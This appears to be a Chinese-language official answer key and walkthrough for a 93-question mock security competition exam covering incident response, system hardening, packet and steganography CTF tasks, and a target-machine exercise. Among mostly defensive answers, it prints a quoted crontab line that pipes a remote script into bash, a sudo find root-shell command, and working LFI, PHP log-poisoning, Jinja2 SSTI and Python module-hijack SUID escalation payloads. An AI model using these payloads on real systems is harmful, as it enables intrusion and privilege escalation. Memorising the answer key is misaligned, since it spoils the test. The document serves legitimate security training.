# 全真模擬測驗 B 卷：官方標準答案與解題手冊 (Official Walkthrough)

> **教練與覆盤使用指引**：  
> 1. 本手冊對應 `mock_exam_b_lab_questions.md` 全部 93 道實體推演題。  
> 2. 包含官方標準解答、Flag、Wireshark 過濾語法、Volatility 指令、Python 解碼腳本與實戰思路。  
> 3. **實體機台實作驗證支援**：可配合 [`evidence/README.md`](evidence/README.md) 中收錄之實體封包、事件日誌與 [**`phase_6_capstone/ranges/`**](../../knowledge/blue_team/playbooks/phase_6_capstone/ranges/README.md) 靶機進行指令還原。  
> 4. 建議隊伍在完成 180 分鐘實體演練後，全體隊員集中覆盤，逐題校正推演盲點！

---

## 第一部分：IR 事件應變與記憶體取證官方解答 (第 1 ~ 23 題)

### 第 1 題
- **官方標準答案**：`3892`
- **解析依據**：在【證據 A】中，`nc.exe` 的進程列表行顯示：`PID: 3892`，`PPID: 3124`。

### 第 2 題
- **官方標準答案**：映像檔名：`cmd.exe`，PID：`3124`
- **解析依據**：`nc.exe` 的 PPID 為 `3124`。反查 PID `3124`，其 ImageFileName 為 `cmd.exe`（該 cmd.exe 又由 powershell.exe PID 2048 衍生，展現出完整的反向互動 Shell 調用鏈）。

### 第 3 題
- **官方標準答案**：`svch0st.exe` (或 PID 4100)
- **解析依據**：合法系統服務宿主進程為 `svchost.exe`（字母 o）。列表中出現 `svch0st.exe`（數字 0 代替字母 o），且其父進程為 `services.exe` (PID 612)，執行檔存放於 `C:\Users\Public\`，屬於典型的進程名稱欺騙（Typosquatting Process Name）。

### 第 4 題
- **官方標準答案**：外部 IP：`103.20.114.89`，端口：`4444`
- **解析依據**：在【證據 B】netscan 輸出中，PID `3892` (`nc.exe`) 建立了一條對外 `ESTABLISHED` TCP 連線：`192.168.50.10:49211 -> 103.20.114.89:4444`。端口 4444 為 Metasploit 等工具經典監聽端口。

### 第 5 題
- **官方標準答案**：外部 IP：`185.220.101.5`，端口：`8080`
- **解析依據**：在【證據 B】netscan 輸出中，PID `4100` (`svch0st.exe`) 正在向外連線至 `185.220.101.5:8080`，狀態為 `ESTABLISHED`。

### 第 6 題
- **官方標準答案**：攻擊類型：SMB 暴力破解（或網路密碼爆破），發起源 IP：`192.168.50.250`
- **解析依據**：【證據 C】Event 4625 在短短 13 分鐘內大量產生 1,420 次失敗記錄，來源均為 `192.168.50.250`，且 Logon Type 為 3（Network 網路登入，對應 SMB 445 端口），符合自動化密碼暴力破解特徵。

### 第 7 題
- **官方標準答案**：目標帳號：`Administrator`，代碼意義：密碼錯誤（Bad Password）
- **解析依據**：Event 4625 明確標註 `Account Name: Administrator`，失敗狀態碼 `0xC000006A` 在 Windows NT 狀態碼中定義為 `STATUS_WRONG_PASSWORD`（使用者名稱存在但密碼不正確）。

### 第 8 題
- **官方標準答案**：成功帳號：`svc_backup`，Logon Type：`3` (Network)
- **解析依據**：【證據 C 事件記錄 2】顯示在 02:28:45，Event ID 4624（成功登入），目標帳號為備份服務帳號 `svc_backup`，Logon Type 為 3。

### 第 9 題
- **官方標準答案**：服務名稱：`WindowsUpdateAssist`，實體路徑：`C:\Users\Public\svch0st.exe -k netsvcs`
- **解析依據**：【證據 C 事件記錄 3】Event 7045 為服務安裝日誌，攻擊者偽裝微軟更新服務建立後門。

### 第 10 題
- **官方標準答案**：Base64 編碼
- **解析依據**：PowerShell 的 `-enc`（`-EncodedCommand`）參數專門接收以 Base64 編碼的命令字串。

### 第 11 題
- **官方標準答案**：`Unicode` (或 `UTF-16LE`)
- **解析依據**：PowerShell 底層處理 `-EncodedCommand` 時，預設使用 UTF-16 Little Endian（每字元 2 位元組）。若解碼時誤用 UTF-8 會導致亂碼。

### 第 12 題
- **官方標準答案**：帳號：`deployer`，認證方式：公鑰認證（Public Key）
- **解析依據**：【證據 D】`/var/log/auth.log` 載明：`Accepted publickey for deployer from 192.168.50.250 port 52140`。

### 第 13 題
- **官方標準答案**：提權指令：`/usr/bin/find`，參數：`-exec` (執行 `/usr/bin/find . -exec /bin/sh \;`)
- **解析依據**：【證據 D】`sudo: deployer : USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \;`。利用 `find` 的 `-exec` 參數可直接帶起 root 權限的 `/bin/sh`，此為 GTFOBins 標準提權手段。

### 第 14 題
- **官方標準答案**：執行頻率：每 10 分鐘一次（`*/10 * * * *`），惡意 URL：`http://103.20.114.89/check.sh`
- **解析依據**：【證據 D】`/etc/crontab` 記載 `*/10 * * * * root curl -fsSL http://103.20.114.89/check.sh | bash`。

### 第 15 題
- **官方標準答案**：`vol -f memory.dmp windows.memmap --pid 4100 --dump` (或使用 `windows.dumpfiles --pid 4100`)
- **解析依據**：Volatility 3 中透過 `windows.memmap` 配合 `--dump` 參數可提取指定 PID 的記憶體映射檔案。

### 第 16 題
- **官方標準答案**：`windows.hashdump`
- **解析依據**：`windows.hashdump` 插件能從記憶體中的 SYSTEM 與 SAM 登錄檔蜂巢提取所有本機使用者帳號與對應的 NTLM 雜湊值。

### 第 17 題
- **官方標準答案**：使用文字編輯器（如 `vim /etc/crontab`）刪除惡意 curl 任務行，並檢查 `/etc/cron.*` 與 `/var/spool/cron/crontabs/` 是否有殘留後門，隨後重啟 cron 守護進程。
- **解析依據**：直接編輯系統級 crontab 移除惡意行，同時全面排查所有關聯 cron 目錄。

### 第 18 題
- **官方標準答案**：網路連線登入（Network Logon，如 SMB 檔案共用或 IPC$ 連線）
- **解析依據**：Windows Logon Type 3 定義為 Network Logon，非本機互動（Type 2）亦非遠端桌面（Type 10）。

### 第 19 題
- **官方標準答案**：圍堵階段（Containment）
- **解析依據**：NIST SP 800-61 中，拔除網線、切斷網路連線、隔離受害主機以防止威脅橫向擴散與資料持續外洩，屬於標準的「圍堵（Containment）」處置。

### 第 20 題
- **官方標準答案**：是
- **解析依據**：Prefetch 檔案由 Windows 核心快取管理器在應用程式實際執行時自動產生。若存在 `SVCH0ST.EXE-XXXXXXXX.pf`，即具備法庭級證據能力，能 100% 證明該程式曾在該系統上執行過。

### 第 21 題
- **官方標準答案**：硬體防寫裝置（Write Blocker / 唯讀防寫橋接器）
- **解析依據**：取證採集標準規範，必須串接硬體 Write Blocker 阻斷所有對原始硬碟的寫入訊號。

### 第 22 題
- **官方標準答案**：`MD5` 與 `SHA-256` (或 `SHA-1`)
- **解析依據**：數位取證規範（ISO/IEC 27037），通常同時計算雙重獨立雜湊演算法（如 MD5 + SHA-256）交叉校驗鏡像完整性。

### 第 23 題
- **官方標準答案**：`(3) -> (4) -> (1) -> (2) -> (5)`
- **解析依據**：
  1. (3) 02:15~02:28 SMB 密碼爆破並登入成功；
  2. (4) 02:46 反彈 NC Shell；
  3. (1) 02:50 安裝 Windows 惡意服務持久化；
  4. (2) 03:02 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；
  5. (5) 提權後在 Linux 建立 Crontab 惡意排程。

---

## 第二部分：系統安全加固官方解答 (第 24 ~ 51 題)

### 第 24 題
- **官方標準答案**：參數：`PermitRootLogin`，值：`no`
- **解析依據**：在 `/etc/ssh/sshd_config` 設定 `PermitRootLogin no`，禁止 root 直登。

### 第 25 題
- **官方標準答案**：參數：`PasswordAuthentication`，值：`no`
- **解析依據**：設定 `PasswordAuthentication no` 關閉密碼認證，強制走公鑰認證。

### 第 26 題
- **官方標準答案**：`ClientAliveInterval 60` 與 `ClientAliveCountMax 3`
- **解析依據**：`ClientAliveInterval` 指定伺服器向客戶端發送空閒檢查間隔（秒），`ClientAliveCountMax` 指定累計未回應次數後斷開連線。

### 第 27 題
- **官方標準答案**：`PASS_MAX_DAYS 90`
- **解析依據**：`/etc/login.defs` 中 `PASS_MAX_DAYS` 控制新建立使用者密碼的最長有效天數。

### 第 28 題
- **官方標準答案**：`minlen = 12`，`dcredit = -1` (至少1數字)，`ucredit = -1` (至少1大寫)，`lcredit = -1` (至少1小寫)，`ocredit = -1` (至少1特殊字元)
- **解析依據**：`pwquality.conf` 中負值代表強制要求該類型字元的最小數量。

### 第 29 題
- **官方標準答案**：在 `/etc/pam.d/common-auth` 中加入 `auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900`
- **解析依據**：`pam_faillock` 模組透過 `deny=5 unlock_time=900` 達成連續錯誤 5 次鎖定 900 秒（15 分鐘）。

### 第 30 題
- **官方標準答案**：`find / -perm -4000 -type f 2>/dev/null` (或 `find / -perm -u=s -type f 2>/dev/null`)
- **解析依據**：`-perm -4000` 匹配所有具備 SUID 八進位權限的檔案，`2>/dev/null` 屏蔽無權限存取目錄的報錯資訊。

### 第 31 題
- **官方標準答案**：權限：`0640` (或 `0000` / `0600`)，Owner/Group：`root:shadow` (或 `root:root`)
- **解析依據**：合規基準要求 `/etc/shadow` 僅 root 與 shadow 群組可讀，禁止任何普通使用者讀取。

### 第 32 題
- **官方標準答案**：`net.ipv4.icmp_echo_ignore_broadcasts = 1`
- **解析依據**：在 `/etc/sysctl.conf` 中將該核心參數設為 1 可忽略所有發往子網廣播位址的 ICMP Echo 請求。

### 第 33 題
- **官方標準答案**：`net.ipv4.ip_forward = 0`
- **解析依據**：將 `ip_forward` 設為 0 關閉 IPv4 路由轉發。

### 第 34 題
- **官方標準答案**：`ufw default deny incoming` 與 `ufw default allow outgoing`
- **解析依據**：設定 UFW 預設原則為拒絕所有入站、允許所有出站。

### 第 35 題
- **官方標準答案**：`iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` (或 `-m state --state ...`)
- **解析依據**：基於連線狀態追蹤機制放行已建立連線之雙向回應封包。

### 第 36 題
- **官方標準答案**：將其從 sudoers 中完全移除；或若需特定尋找功能，應封裝成限定路徑與參數的固定 Shell 腳本，禁止直接授權帶有 `-exec` 參數的二進位程式。
- **解析依據**：`find` 的 `-exec` 能直接衍生任意 shell，授與 `find` 無密碼 sudo 等同於直接贈與 root 權限。

### 第 37 題
- **官方標準答案**：`chattr +a /var/log/secure` (或 `chattr +i` 設定完全不可變)
- **解析依據**：`+a` 屬性表示 append-only（僅允許追加寫入），連 root 都無法刪除或覆寫已存在的日誌內容。

### 第 38 題
- **官方標準答案**：`export HISTTIMEFORMAT="%F %T "`
- **解析依據**：導出該變數後，`history` 指令輸出將精確標註每條歷史命令的執行年月日時分秒。

### 第 39 題
- **官方標準答案**：「帳戶鎖定閥值」（Account lockout threshold）設定為 5 次；「帳戶鎖定期間」（Account lockout duration）設定為 30 分鐘。
- **解析依據**：Windows 本機原則中的標準兩項帳戶鎖定配置。

### 第 40 題
- **官方標準答案**：啟用「強制密碼歷程」（Enforce password history），至少設定記住 `5` 次（或 24 次）。
- **解析依據**：防止使用者在密碼過期輪替時立即重複使用前幾次的舊密碼。

### 第 41 題
- **官方標準答案**：`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol` (或 `Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force`)
- **解析依據**：PowerShell 停用 SMBv1 協定的標準命令。

### 第 42 題
- **官方標準答案**：機碼名稱：`AutoShareServer`，數值：`0` (DWORD)
- **解析依據**：在伺服器版 Windows 中將 `AutoShareServer` 設為 0 可於開機時自動停用管理共用（工作站版對應 `AutoShareWks`）。

### 第 43 題
- **官方標準答案**：防止 RDP 中間人攻擊（MITM）與連線建立前的預驗證拒絕服務攻擊（如 BlueKeep 預認證 RCE）。
- **解析依據**：NLA 強制客戶端在與 RDP 伺服器建立正式繪圖連線前，必須先透過 CredSSP 完成身分驗證。

### 第 44 題
- **官方標準答案**：「稽核登入事件」（Audit Logon Events）與「稽核帳戶管理」（Audit Account Management）（均勾選成功與失敗）。
- **解析依據**：監控帳戶登入（Event 4624/4625）與提權/建立帳號（Event 4720）的最高優先度稽核項目。

### 第 45 題
- **官方標準答案**：啟用「在處理序建立事件中包含命令列」（Include command line in process creation events）。
- **解析依據**：在電腦設定 -> 系統管理範本 -> 系統 -> 稽核程序建立原則中啟用該項，才能在 Event ID 4688 中捕獲具體參數。

### 第 46 題
- **官方標準答案**：停用 `Guest` 帳戶；將預設 `Administrator` 帳戶重新命名為非常見名稱，並為其設定強密碼。
- **解析依據**：消滅內建帳號名稱所引發的字典撞庫與橫向利用風險。

### 第 47 題
- **官方標準答案**：`bcdedit.exe /set {current} nx AlwaysOn`
- **解析依據**：將 NX（DEP）原則強制設定為 `AlwaysOn`，所有進程一律強制啟用資料執行防止。

### 第 48 題
- **官方標準答案**：等級 5：「僅傳送 NTLMv2 回應，拒絕 LM 和 NTLM」（Send NTLMv2 response only. Refuse LM & NTLM）。
- **解析依據**：徹底淘汰易遭受彩虹表爆破與中間人破解的弱 LM 與 NTLMv1 協定。

### 第 49 題
- **官方標準答案**：停用基本驗證（Basic Authentication）與未加密連線。
- **解析依據**：WinRM 基本認證以明文傳遞密碼，必須停用並強制走 Negotiate/Kerberos 或 HTTPS。

### 第 50 題
- **官方標準答案**：`netsh advfirewall firewall add rule name="Block_SMB_445" protocol=TCP dir=in localport=445 action=block` (或 `New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block`)
- **解析依據**：在 Windows 防火牆建立入站阻塞規則防禦未授權 SMB 存取。

### 第 51 題
- **官方標準答案**：`30` 天（關鍵高危漏洞通常要求 7 ~ 14 天內完成修補）。
- **解析依據**：國際標準規範要求一般安全性修補週期不超過 30 天，CVSS $\ge 9.0$ 重大漏洞需於 72 小時至 7 天內完成緊急修補。

---

## 第三部分：CTF I 封包分析與密碼隱寫官方解答 (第 52 ~ 81 題)

### 第 52 題
- **官方標準答案**：`tunnel.exfil.org`
- **解析依據**：【證據 E】所有查詢子域名的頂層後綴均固定為 `.tunnel.exfil.org`。

### 第 53 題
- **官方標準答案**：分片序列號（Sequence Number），用於標識資料分片的先後順序，確保接收端拼接時不失序。
- **解析依據**：`s000`, `s001`, ... `s061` 代表第 0 號至第 61 號資料封包分片。

### 第 54 題
- **官方標準答案**：`Base32` 編碼
- **解析依據**：Base32 字符集為大寫字母 `A-Z` 與數字 `2-7`（共 32 個字元），不包含容易與數字 0/1 混淆的字母 O、I，極度適合在對大小寫不敏感的 DNS 查詢中傳輸數據。

### 第 55 題
- **官方標準答案**：`=` (等號)
- **解析依據**：RFC 4648 定義 Base32 編碼在不足 40 位元（5 位元組）分組時使用 `=` 作為填充。在 DNS 域名中為防語法報錯，填充等號常被省略或替換。

### 第 56 題
- **官方標準答案**：`62` 個
- **解析依據**：從 `s000` 到 `s061`，編號從 0 開始計數至 61，總計為 $61 - 0 + 1 = 62$ 個查詢請求。

### 第 57 題
- **官方標準答案**：檔案格式：`CSV` 檔案；欄位：`id, name, credit_card, phone, email`
- **解析依據**：【證據 F】表頭第一行為 `id,name,credit_card,phone,email`，標準逗號分隔格式。

### 第 58 題
- **官方標準答案**：`29` 名
- **解析依據**：CSV 記錄從 `id=1`（Samuel Edwards）至 `id=29`（Zachary Reed），總共洩漏 29 筆客戶資料。

### 第 59 題【核心 Flag 題】
- **官方標準答案**：`skill54{sl0w_l34k_thru_dns53}`
- **解析依據與解密還原**：  
  將 29 位客戶 `name` 欄位首字元垂直提取：
  1. id 1: **S**amuel -> `s`
  2. id 2: **k**atherine -> `k`
  3. id 3: **i**an -> `i`
  4. id 4: **l**ucas -> `l`
  5. id 5: **l**iam -> `l`
  6. id 6: **5**teven -> `5`
  7. id 7: **4**ndrew -> `4`
  8. id 8: **{**ictor -> `{`
  9. id 9: **s**ophia -> `s`
  10. id 10: **l**ogan -> `l`
  11. id 11: **0**liver -> `0`
  12. id 12: **w**illiam -> `w`
  13. id 13: **_**ack -> `_`
  14. id 14: **l**ucas -> `l`
  15. id 15: **3**velyn -> `3`
  16. id 16: **4**lexander -> `4`
  17. id 17: **k**evin -> `k`
  18. id 18: **_**athan -> `_`
  19. id 19: **t**homas -> `t`
  20. id 20: **h**enry -> `h`
  21. id 21: **r**yan -> `r`
  22. id 22: **u**lysses -> `u`
  23. id 23: **_**ane -> `_`
  24. id 24: **d**avid -> `d`
  25. id 25: **n**oah -> `n`
  26. id 26: **s**ophia -> `s`
  27. id 27: **5**amuel -> `5`
  28. id 28: **3**mma -> `3`
  29. id 29: **}**achary -> `}`  
  垂直拼合即為：`skill54{sl0w_l34k_thru_dns53}`！

#### 【實戰 Python 解碼與拼裝腳本（供隊員覆盤學習）】
```python
import base64
import re

# 模擬從 PCAP 提取出的 subdomains 清單
dns_queries = [
    ("s000", "NVYWK4ROEB2GQZJAM5SW23DF"),
    ("s001", "MVSCA43FNRXWO2LOEB2GQZJA"),
    # ...
]
# 1. 依序號排序並去除前綴
dns_queries.sort(key=lambda x: x[0])
b32_payload = "".join([q[1] for q in dns_queries])

# 2. 自動補齊 Base32 填充 '=' 至 8 的倍數
pad_len = (8 - len(b32_payload) % 8) % 8
b32_payload += "=" * pad_len

# 3. 解碼 CSV
csv_text = base64.b32decode(b32_payload).decode("utf-8")

# 4. 垂直提取 Name 首字元
lines = csv_text.strip().split("\n")[1:]  # 跳過表頭
flag = "".join([line.split(",")[1][0] for line in lines])
print("Extracted Flag:", flag)  # 輸出: skill54{sl0w_l34k_thru_dns53}
```

### 第 60 題
- **官方標準答案**：`sqlmap`，版本 `1.6#stable`
- **解析依據**：HTTP 請求標頭顯示：`User-Agent: sqlmap/1.6#stable (https://sqlmap.org)`。

### 第 61 題
- **官方標準答案**：技術類型：`UNION 查詢注入`（Union-based SQL Injection）；資料表名稱：`ctf_flags`
- **解析依據**：請求中使用了 `UNION SELECT 1,table_name,3 FROM information_schema.tables`，並鎖定目標表 `ctf_flags`。

### 第 62 題
- **官方標準答案**：`flag{sql_1nj3ct10n_m4st3r_2026}`
- **解析依據**：【證據 G】HTTP 回應內容直接輸出：`<!-- Output: 1 | flag{sql_1nj3ct10n_m4st3r_2026} | 3 -->`。

### 第 63 題
- **官方標準答案**：`dns.flags.response == 0` (或 `dns and not dns.flags.response == 1`)
- **解析依據**：Wireshark 中 `dns.flags.response == 0` 代表該 DNS 封包為客戶端發出的查詢請求（Query），若為 1 則為伺服器回應（Response）。

### 第 64 題
- **官方標準答案**：`tshark -r Topic1.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name > queries.txt`
- **解析依據**：`tshark` 提取指定欄位 `-T fields -e dns.qry.name` 為 CTF 封包提取標準指令。

### 第 65 題
- **官方標準答案**：`secure_file_priv` 不能為 NULL（需為空或指定目錄），且使用者需具備 `FILE` 特權。
- **解析依據**：MySQL `load_file()` 嚴格受 `secure_file_priv` 限制。若為 NULL 則完全禁止讀取本機檔案。

### 第 66 題
- **官方標準答案**：Linux ELF 可執行檔（ELF Binary）
- **解析依據**：`0x7F 0x45 0x4C 0x46` 即 ASCII 字元 `\x7fELF`，為 Linux 執行檔標準魔術數字。

### 第 67 題
- **官方標準答案**：`tcp contains "flag{"` (或 `frame contains "flag{"`)
- **解析依據**：Wireshark `contains` 關鍵字支援字串不區分大小寫或精確匹配，可快速檢索明文 Flag。

### 第 68 題
- **官方標準答案**：`TCP 21`
- **解析依據**：FTP 控制通道標準端口為 21（資料傳輸通道為主動模式 20 或被動模式隨機高端口）。

### 第 69 題
- **官方標準答案**：Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename
- **解析依據**：Wireshark 載入 `SSLKEYLOGFILE` 的標準選單路徑。

### 第 70 題
- **官方標準答案**：隱寫技術：PNG 高度/寬度篡改隱寫；修復方式：使用 Python 腳本根據 CRC32 校驗碼爆破計算原始正確寬高，並以十六進位編輯器（010 Editor）修復 IHDR 塊。
- **解析依據**：PNG 規格中，IHDR 數據塊（長度 13 位元組）末尾帶有 4 位元組的 CRC32。若篡改高度，CRC32 校驗會失敗，可透過窮舉高度計算 CRC32 迅速還原真實圖片尺寸。

### 第 71 題
- **官方標準答案**：工具：`Audacity`；檢視模式：`頻譜圖`（Spectrogram）
- **解析依據**：音訊頻譜圖隱寫常將文字以頻率振幅描繪在超音波或高頻波段，切換為 Spectrogram 即可直接肉眼識讀。

### 第 72 題
- **官方標準答案**：將加密標誌位改為 `0x00 00`（將第 0 位元由 1 改為 0）。
- **解析依據**：ZIP 偽加密修改 Central Directory 或 Local File Header 中的 Flag，將末位改為 0 即可去除偽裝密碼直接解壓縮。

### 第 73 題
- **官方標準答案**：`flag{this_is_world}` (或依據解碼字串：`flag{this_a_world}`)
- **解析依據**：十六進位解碼 `5a6d7868...` 得到 Base64 字串 `ZmxhZ3t0aGlzX2...=`，Base64 解碼得到 Flag。

### 第 74 題
- **官方標準答案**：`KHOOR`
- **解析依據**：`H(+3)->K`, `E(+3)->H`, `L(+3)->O`, `L(+3)->O`, `O(+3)->R`。

### 第 75 題
- **官方標準答案**：`t` (原字元為 `g`，`g` 在字母表中第 7 位，$7 + 13 = 20$，第 20 位為 `t`，對應 Flag 開頭 `t1014308{` 或類似標籤)
- **解析依據**：ROT13 密碼對稱變換原理。

### 第 76 題
- **官方標準答案**：`-m 500`
- **解析依據**：Hashcat 中，MD5-Crypt (`$1$`) 的專屬演算法代碼為 `500`（SHA-256 Crypt 為 7400，SHA-512 Crypt 為 1800）。

### 第 77 題
- **官方標準答案**：ICMP 隧道隱蔽通道通訊（ICMP Tunneling / Data Exfiltration）
- **解析依據**：正常 Ping 的 Data 是靜態字元，Data 隨時間變化且承載特定長度結構即為 ICMP 隧道特徵。

### 第 78 題
- **官方標準答案**：紅色（客戶端發送）與藍色（伺服器回應）
- **解析依據**：Wireshark 追蹤 TCP 串流的經典配色標準。

### 第 79 題
- **官方標準答案**：破殼漏洞（Shellshock，CVE-2014-6271）
- **解析依據**：`() { :; };` 是 Bash 在處理環境變數中定義的函數後續執行任意指令的標誌性特徵。

### 第 80 題
- **官方標準答案**：`exiftool` (或 `strings`)
- **解析依據**：`exiftool image.jpg` 能完整傾印出所有相機中繼資料與自訂註解。

### 第 81 題
- **官方標準答案**：檢測並限制 DNS 查詢請求頻率；阻斷過長子域名（例如長度超過 50 字元）；阻斷熵值（Shannon Entropy）異常高的大寫字母/數字查詢；啟用 DNS RPZ 阻斷未經許可的外部遞歸解析。
- **解析依據**：DNS 隧道具備高頻率、長域名、高字符隨機熵之特徵，透過長度與頻率閥值能有效攔截。

---

## 第四部分：CTF II 實戰靶機渗透官方解答 (第 82 ~ 93 題)

### 第 82 題
- **官方標準答案**：框架：`Werkzeug / Flask`，Python 版本：`Python 3.8.10`
- **解析依據**：【證據 H】8080 端口 Nmap 報告明確識別：`Werkzeug/2.0.2 Python/3.8.10`，對應 Python Flask 應用。

### 第 83 題
- **官方標準答案**：`doc=report/../../../../etc/passwd` (或 `doc=report/../etc/passwd`，或 `doc=../../../../etc/passwd%00report`)
- **解析依據**：代碼檢查 `strpos($page, "report") !== false`，只需在遍歷路徑中包含單詞 `report` 即可繞過檢查，隨後利用 `../` 回退至根目錄讀取 `/etc/passwd`。

### 第 84 題
- **官方標準答案**：日誌投毒（Log Poisoning / Apache Access Log LFI to RCE）
- **解析依據**：透過向 Web 發送帶有 PHP 代碼的請求（如 `User-Agent: <?php system($_GET['cmd']); ?>`），代碼被寫入 access.log，隨後藉由 LFI 包含該日誌檔案觸發代碼執行。

### 第 85 題
- **官方標準答案**：伺服器端模板注入漏洞（SSTI，Server-Side Template Injection）
- **解析依據**：【證據 J】代碼使用 `f"<h3>Hello, {name}!...</h3>"` 進行字串格式化拼接後，直接傳入 `render_template_string()`，造成標準 Jinja2 SSTI。

### 第 86 題
- **官方標準答案**：`name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` (或利用 `lipsum`、`cycler` 等內建對象)
- **解析依據**：Jinja2 中透過當前物件存取全域環境中的 `os.popen()` 執行系統指令並讀取輸出。

### 第 87 題
- **官方標準答案**：`python3 -c 'import pty; pty.spawn("/bin/bash")'` 配合 `Ctrl+Z`、`stty raw -echo; fg`
- **解析依據**：利用 Python `pty.spawn` 升級為完整終端機 TTY 的標準黑客操作。

### 第 88 題
- **官方標準答案**：允許以 `root` 身分無密碼執行 `/usr/bin/python3 /opt/maintenance/cleanup.py`
- **解析依據**：【證據 K】`sudo -l` 標明：`(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance/cleanup.py`。

### 第 89 題
- **官方標準答案**：Python 模組劫持提權（Python Module Hijacking / Privilege Escalation）
- **解析依據**：Python 載入模組時，預設優先搜尋當前工作目錄或主腳本所在目錄。由於 `/opt/maintenance/` 對 `developer` 群組可寫，攻擊者在該目錄下建立自定義的 `helper.py`，當 root 執行 `sudo python3 cleanup.py` 時，會優先載入攻擊者的 `helper.py`，從而以 root 權限執行任意代碼。

### 第 90 題
- **官方標準答案**：
```python
# /opt/maintenance/helper.py
import os


def clean_temp():
  os.system(
      "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"
  )  # 賦予 SUID
```
隨後執行 `sudo /usr/bin/python3 /opt/maintenance/cleanup.py`，再執行 `/tmp/rootbash -p` 即可獲取 root shell。
- **解析依據**：實現 `clean_temp()` 函數滿足原腳本調用，並在內部注入提權指令。

### 第 91 題
- **官方標準答案**：`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`
- **解析依據**：實體題幹給定之最終提權 Flag。

### 第 92 題
- **官方標準答案**：檢查 `/etc/ssh/sshd_config` 中的 `PermitRootLogin` 設定，並校驗 `/root/.ssh/authorized_keys` 中每一條公鑰的擁有者身分與雜湊指紋。
- **解析依據**：防止未授權公鑰遺留形成隱蔽後門。

### 第 93 題
- **官方標準答案**：
  1. 目錄權限修復：將 `/opt/maintenance/` 目錄權限收回，設為僅 root 可寫（`chown root:root /opt/maintenance && chmod 755 /opt/maintenance`）；
  2. sudoers 修復：從 `/etc/sudoers` 中移除該行無密碼授權，或指定完整的安全環境與固定腳本 Hash。
- **解析依據**：消除模組目錄可寫與 sudo 過度放權的根源配置弱點。

---

## 實戰推演自評成績換算與合格標準

| 大項 | 涵蓋題數 | 總分 | 通過安全線 | 實戰能力評估指標 |
| :--- | :--- | :--- | :--- | :--- |
| **第一部分：IR 事件應變** | 第 01 ~ 23 題 | **25 分** | **$\ge 20$ 分** | 考查記憶體（Volatility）、事件日誌（4624/4625/7045）、Linux 軌跡的關聯分析能力。 |
| **第二部分：系統安全加固** | 第 24 ~ 51 題 | **30 分** | **$\ge 24$ 分** | 考查 Linux SSH/PAM/iptables 與 Windows GPO/SMB/安全原則的實務配置能力。 |
| **第三部分：CTF I 封包分析** | 第 52 ~ 81 題 | **30 分** | **$\ge 25$ 分** | 考查 DNS 隧道序列、Base32 解碼、隱寫垂直拼詞、Wireshark 語法。 |
| **第四部分：CTF II 實戰靶機** | 第 82 ~ 93 題 | **15 分** | **$\ge 12$ 分** | 考查 Nmap 服務識別、LFI/SSTI 利用、Python 模組劫持與 SUID 提權。 |
| **全卷總計** | **共 93 題** | **100 分** | **$\ge 80$ 分** | **85 分以上具備全國競賽優勝/金盾獎前三名水準！** |


